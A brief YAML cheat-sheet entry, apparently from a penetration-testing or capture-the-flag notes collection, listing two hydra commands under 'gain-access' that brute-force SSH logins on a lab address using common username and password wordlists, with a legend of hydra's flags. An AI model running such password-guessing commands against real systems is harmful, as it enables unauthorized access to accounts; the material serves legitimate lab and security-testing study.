---
functions:
  gain-access:
    - description: hydra
      code: |
        hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://10.10.10.190:22 -t 6
        hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://10.10.10.190:22 -t 6
        
        -l --> username
        -L --> username list
        -p --> password
        -P --> password list
        -t --> threads
---
